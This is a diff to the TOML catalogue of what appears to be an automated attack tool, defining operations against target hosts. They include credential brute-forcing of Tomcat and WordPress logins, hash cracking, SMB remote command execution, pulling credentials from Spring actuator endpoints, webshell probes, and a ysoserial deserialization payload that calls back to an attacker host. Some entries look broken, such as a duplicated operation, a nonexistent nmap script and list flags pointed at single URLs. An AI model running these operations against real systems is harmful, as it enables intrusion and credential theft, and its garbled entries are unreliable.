-args = ['-u', '{url}?{param}=FUZZ', '-w', '/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt', '-mc', '200', '-t', '10']
+args = ['-u', '{url}?{param}=FUZZ', '-w', '{wl:fuzz/lfi.txt}', '-mc', '200', '-t', '10']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -17023,7 +17032,7 @@ network = true
 binary = 'curl'
 [[capability.provider.operation]]
 name = 'Cloud Function Env Pull'
-args = ['-sk', '{url}/actuator/env', '|', 'grep', 'credentials']
+args = ['-sk', '{url}/actuator/env']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -17086,7 +17095,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Actuator Path Fuzz'
-args = ['-u', '{url}/actuator/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/spring-boot.txt', '-mc', '200', '-t', '10']
+args = ['-u', '{url}/actuator/FUZZ', '-w', '{wl:web/spring-boot.txt}', '-mc', '200', '-t', '10']
 output = 'lines'
 network = true
 
@@ -17098,6 +17107,7 @@ summary = 'Exploit unauthenticated proxy and edge device RCE vectors'
 inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'lhost', type = 'target', required = true },
+  { key = 'url', type = 'url', required = false },
 ]
 [[capability.provider]]
 binary = 'curl'
@@ -17195,7 +17205,7 @@ network = true
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'Preauth Critical List Sweep'
-args = ['-l', '/tmp/urls.txt', '-tags', 'pre-auth', '-severity', 'critical', '-silent', '-nc']
+args = ['-u', '{url}', '-tags', 'pre-auth', '-severity', 'critical', '-silent', '-nc']
 output = 'lines'
 network = true
 
@@ -17252,8 +17262,23 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nxc'
-[[capability.provider]]
-operation_placeholder2 = true
+[[capability.provider.operation]]
+name = 'SMB Signing Check'
+args = ['smb', '{rhost}', '--enum-signing', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'SMB Share Enum'
+args = ['smb', '{rhost}', '--shares', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'SMB Vuln Enum'
+args = ['smb', '{rhost}', '--vulns', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'SMB Command Exec'
 args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'whoami']
@@ -17261,8 +17286,11 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nmap'
-[[capability.provider]]
-name_placeholder = true
+[[capability.provider.operation]]
+name = 'SMB Named Pipe Enum'
+args = ['-p', '445', '--script', 'smb-enum-shares,smb-enum-pipes', '{rhost}']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'SMB Vuln Full Sweep'
 args = ['-p', '445', '--script', 'smb-vuln-*', '{rhost}']
@@ -17394,8 +17422,17 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nmap'
-[[capability.provider]]
-name_placeholder2 = true
+[[capability.provider.operation]]
+name = 'Spooler Service Check'
+args = ['-p', '445', '--script', 'smb-vuln-ms17-010 -d', '{rhost}']
+output = 'lines'
+network = true
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Print Spooler Enum'
+args = ['-p', '135,139,445', '--script', 'spooled-vuln-check', '{rhost}']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'RPC Endpoint Scan'
 args = ['-p', '135,445,631', '--script', 'rpcinfo', '{rhost}']
@@ -17419,7 +17456,7 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Coerced NetNTLMv2 Crack'
-args = ['-m', '5600', '-a', '0', '/tmp/coerced.hash', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '5600', '-a', '0', '/tmp/coerced.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -17513,8 +17550,11 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nmap'
-[[capability.provider]]
-name_placeholder3 = true
+[[capability.provider.operation]]
+name = 'Redis Info Sweep'
+args = ['-p', '6379', '--script', 'redis-info', '{rhost}']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'Redis Unauth Script'
 args = ['-p', '6379', '--script', 'redis-brute', '{rhost}']
@@ -17631,7 +17671,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Jenkins Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,403', '-t', '10']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,403', '-t', '10']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -17643,8 +17683,17 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'httpx'
-[[capability.provider]]
-name_placeholder4 = true
+[[capability.provider.operation]]
+name = 'Jenkins Status Confirm'
+args = ['-u', '{url}', '-status-code', '-title', '-web-server', '-silent', '-nc']
+output = 'lines'
+network = true
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Jenkins Login Surface'
+args = ['-u', '{url}', '-path', '/login', '/asynchPeople/', '-sc', '-silent', '-nc']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'Jenkins Tech Confirm'
 args = ['-u', '{url}', '-tech-detect', '-title', '-silent', '-nc']
@@ -17668,6 +17717,8 @@ inputs = [
   { key = 'rport', type = 'port', required = false, default = '8080' },
   { key = 'username', type = 'username', required = false, default = 'tomcat' },
   { key = 'password', type = 'password', required = false, default = 'tomcat' },
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = false, default = '4444' },
 ]
 [[capability.provider]]
 binary = 'curl'
@@ -17711,7 +17762,7 @@ network = true
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'Tomcat Cred Brute'
-args = ['-l', '{username}', '-P', '/usr/share/wordlists/rockyou.txt', 'http-get://{rhost}:{rport}/manager/html']
+args = ['-l', '{username}', '-P', '{wl:passwords/rockyou.txt}', 'http-get://{rhost}:{rport}/manager/html']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -17737,8 +17788,23 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'curl'
-[[capability.provider]]
-name_placeholder5 = true
+[[capability.provider.operation]]
+name = 'Manager Deploy Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'http://{rhost}:{rport}/manager/html']
+output = 'lines'
+network = true
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Tomcat Version Banner'
+args = ['-skI', 'http://{rhost}:{rport}']
+output = 'lines'
+network = true
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Deploy Endpoint Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'http://{rhost}:{rport}/manager/text/deploy']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'Examples Path Probe'
 args = ['-sk', 'http://{rhost}:{rport}/examples/']
@@ -17822,7 +17888,7 @@ network = true
 binary = 'java'
 [[capability.provider.operation]]
 name = 'T3 Payload Build'
-args = ['-jar', 'ysoserial.jar', 'CommonsCollections5', 'curl http://{lhost}:9001', '>', '/tmp/t3payload.ser']
+args = ['-jar', 'ysoserial.jar', 'CommonsCollections2', 'curl', 'http://{lhost}:9001']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -17885,7 +17951,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Weblogic Path Fuzz'
-args = ['-u', 'http://{rhost}:{rport}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302,403', '-t', '20']
+args = ['-u', 'http://{rhost}:{rport}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,302,403', '-t', '20']
 output = 'lines'
 network = true
 
@@ -17972,7 +18038,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Struts Action Fuzz'
-args = ['-u', '{url}/FUZZ.action', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302', '-t', '20']
+args = ['-u', '{url}/FUZZ.action', '-w', '{wl:web/common.txt}', '-mc', '200,302', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18005,6 +18071,7 @@ summary = 'Exploit vulnerable WordPress plugins and themes for RCE'
 inputs = [
   { key = 'url', type = 'url', required = true },
   { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = false, default = '4444' },
 ]
 [[capability.provider]]
 binary = 'wpscan'
@@ -18073,7 +18140,7 @@ network = true
 binary = 'wpscan'
 [[capability.provider.operation]]
 name = 'Password Attack'
-args = ['--url', '{url}', '--usernames', 'admin', '--passwords', '/usr/share/wordlists/rockyou.txt']
+args = ['--url', '{url}', '--usernames', 'admin', '--passwords', '{wl:passwords/rockyou.txt}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18087,7 +18154,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'WP Path Fuzz'
-args = ['-u', '{url}/wp-content/plugins/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt', '-mc', '200,403', '-t', '20']
+args = ['-u', '{url}/wp-content/plugins/FUZZ', '-w', '{wl:web/wp-plugins.txt}', '-mc', '200,403', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18106,8 +18173,23 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'wpscan'
-[[capability.provider]]
-name_placeholder6 = true
+[[capability.provider.operation]]
+name = 'WP Users Enumerate'
+args = ['--url', '{url}', '--enumerate', 'u', '--batch']
+output = 'lines'
+network = true
+binary = 'wpscan'
+[[capability.provider.operation]]
+name = 'WP Plugins Enumerate'
+args = ['--url', '{url}', '--enumerate', 'vp', '--batch']
+output = 'lines'
+network = true
+binary = 'wpscan'
+[[capability.provider.operation]]
+name = 'WP Theme Enumerate'
+args = ['--url', '{url}', '--enumerate', 't', '--batch']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'Aggressive User Enum'
 args = ['--url', '{url}', '--enumerate', 'u', '--users-detection', 'aggressive']
@@ -18237,6 +18319,7 @@ summary = 'Exploit Citrix NetScaler ADC RCE and info leak vectors'
 inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'lhost', type = 'target', required = true },
+  { key = 'url', type = 'url', required = false },
 ]
 [[capability.provider]]
 binary = 'curl'
@@ -18326,7 +18409,7 @@ network = true
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'Citrix CVE List Sweep'
-args = ['-l', '/tmp/urls.txt', '-tags', 'citrix', '-severity', 'critical', '-silent', '-nc']
+args = ['-u', '{url}', '-tags', 'citrix', '-severity', 'critical', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18340,7 +18423,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Citrix Path Fuzz'
-args = ['-u', 'https://{rhost}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302', '-t', '20']
+args = ['-u', 'https://{rhost}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,302', '-t', '20']
 output = 'lines'
 network = true
 
@@ -18352,6 +18435,7 @@ summary = 'Exploit VMware vCenter RCE and SSRF vectors'
 inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'lhost', type = 'target', required = true },
+  { key = 'url', type = 'url', required = false },
 ]
 [[capability.provider]]
 binary = 'curl'
@@ -18441,14 +18525,14 @@ network = true
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'VMware CVE Critical Sweep'
-args = ['-l', '/tmp/urls.txt', '-tags', 'vmware', '-severity', 'critical', '-silent', '-nc']
+args = ['-u', '{url}', '-tags', 'vmware', '-severity', 'critical', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'VCenter Path Fuzz'
-args = ['-u', 'https://{rhost}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302,403', '-t', '20']
+args = ['-u', 'https://{rhost}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,302,403', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18519,8 +18603,23 @@ output = 'json'
 network = true
 [[capability.provider]]
 binary = 'curl'
-[[capability.provider]]
-name_placeholder7 = true
+[[capability.provider.operation]]
+name = 'GitLab API Version'
+args = ['-sk', '{url}/api/v4/version']
+output = 'lines'
+network = true
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab Projects List'
+args = ['-sk', '{url}/api/v4/projects?per_page=100']
+output = 'json'
+network = true
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GitLab Runners List'
+args = ['-sk', '{url}/api/v4/runners?per_page=100']
+output = 'json'
+network = true
 [[capability.provider.operation]]
 name = 'GitLab Snippet Exfil Probe'
 args = ['-sk', '{url}/api/v4/snippets/public']
@@ -18558,7 +18657,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'GitLab Path Fuzz'
-args = ['-u', '{url}/api/v4/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt', '-mc', '200,401', '-t', '20']
+args = ['-u', '{url}/api/v4/FUZZ', '-w', '{wl:web/api-endpoints.txt}', '-mc', '200,401', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18681,7 +18780,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'OAuth Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,302', '-t', '20']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,302', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18699,7 +18798,6 @@ label = 'PUBLIC CVE SWEEP'
 summary = 'Sweep targets against high yield public CVE exploitation checks'
 inputs = [
   { key = 'url', type = 'url', required = true },
-  { key = 'list', type = 'file', required = false, default = '/tmp/urls.txt' },
 ]
 [[capability.provider]]
 binary = 'nuclei'
@@ -18739,25 +18837,34 @@ network = true
 binary = 'httpx'
 [[capability.provider.operation]]
 name = 'Tech Map Pre Exploit'
-args = ['-l', '{list}', '-tech-detect', '-title', '-sc', '-silent', '-nc']
+args = ['-l', '{url}', '-tech-detect', '-title', '-sc', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'Full List Critical Sweep'
-args = ['-l', '{list}', '-severity', 'critical', '-silent', '-nc']
+args = ['-l', '{url}', '-severity', 'critical', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'Interactive Tags Sweep'
-args = ['-l', '{list}', '-tags', 'interactive,rce', '-silent', '-nc']
+args = ['-l', '{url}', '-tags', 'interactive,rce', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nmap'
-[[capability.provider]]
-name_placeholder8 = true
+[[capability.provider.operation]]
+name = 'Vulners CVE Sweep'
+args = ['-sV', '-p', '80,443,8080,8443', '--script', 'vulners', '{url}']
+output = 'lines'
+network = true
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Known Vuln Script Sweep'
+args = ['-sV', '-p', '80,443', '--script', 'http-vuln-*', '{url}']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'Vuln Script Full Sweep'
 args = ['-sV', '--script', 'vulners', '{url}']
@@ -18774,28 +18881,28 @@ network = true
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'High Sev Full List Sweep'
-args = ['-l', '{list}', '-severity', 'high', '-silent', '-nc']
+args = ['-l', '{url}', '-severity', 'high', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Unknown Endpoint Sweep'
-args = ['-l', '{list}', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200', '-t', '20']
+args = ['-l', '{url}', '-w', '{wl:web/common.txt}', '-mc', '200', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'Out-of-Band Interactive Sweep'
-args = ['-l', '{list}', '-tags', 'oob,rce', '-silent', '-nc', '-interactsh-url']
+args = ['-l', '{url}', '-tags', 'oob,rce', '-silent', '-nc', '-interactsh-url']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'httpx'
 [[capability.provider.operation]]
 name = 'Post Exploit Asset Confirm'
-args = ['-l', '{list}', '-title', '-sc', '-cl', '-silent', '-nc']
+args = ['-l', '{url}', '-title', '-sc', '-cl', '-silent', '-nc']
 output = 'lines'
 network = true
 
@@ -18854,7 +18961,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'IDOR ID Fuzz'
-args = ['-u', '{url}/api/users/FUZZ', '-w', '/usr/share/seclists/Fuzzing/numbers.txt', '-mc', '200', '-t', '10']
+args = ['-u', '{url}/api/users/FUZZ', '-w', '{wl:fuzz/numbers.txt}', '-mc', '200', '-t', '10']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -18910,7 +19017,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'API Endpoint Fuzz'
-args = ['-u', '{url}/api/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt', '-mc', '200', '-t', '20']
+args = ['-u', '{url}/api/FUZZ', '-w', '{wl:web/api-endpoints.txt}', '-mc', '200', '-t', '20']
 output = 'lines'
 network = true
 
@@ -18940,8 +19047,11 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'curl'
-[[capability.provider]]
-name_placeholder9 = true
+[[capability.provider.operation]]
+name = 'Webshell Reachability'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'http://{rhost}/shell.php']
+output = 'lines'
+network = true
 [[capability.provider.operation]]
 name = 'Webshell Proof Capture'
 args = ['-sk', 'http://{rhost}/shell.php?cmd=whoami']
@@ -18956,8 +19066,17 @@ output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'ss'
-[[capability.provider]]
-name_placeholder10 = true
+[[capability.provider.operation]]
+name = 'Callback Listener Confirm'
+args = ['-tlnp']
+output = 'lines'
+network = false
+binary = 'ss'
+[[capability.provider.operation]]
+name = 'Established Callback Confirm'
+args = ['-tnp', 'sport = :{lport}']
+output = 'lines'
+network = false
 [[capability.provider.operation]]
 name = 'Listener Established Verify'
 args = ['-tlnp']
@@ -19014,8 +19133,11 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'file'
-[[capability.provider]]
-name_placeholder11 = true
+[[capability.provider.operation]]
+name = 'Exfil Artifact Verify'
+args = ['/tmp/chain.json']
+output = 'lines'
+network = false
 [[capability.provider.operation]]
 name = 'Exfil Artifact Verify'
 args = ['/tmp/chain.json']
@@ -19340,7 +19462,7 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'PMKID Crack'
-args = ['-m', '22000', '{hashes}', '/usr/share/wordlists/rockyou.txt']
+args = ['-m', '22000', '{hashes}', '{wl:passwords/rockyou.txt}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -19379,7 +19501,7 @@ network = true
 binary = 'asleap'
 [[capability.provider.operation]]
 name = 'MSCHAPv2 Crack'
-args = ['-f', 'mschapv2.txt', '-w', '/usr/share/wordlists/rockyou.txt']
+args = ['-f', 'mschapv2.txt', '-w', '{wl:passwords/rockyou.txt}']
 output = 'lines'
 network = true
 [[capability.provider]]
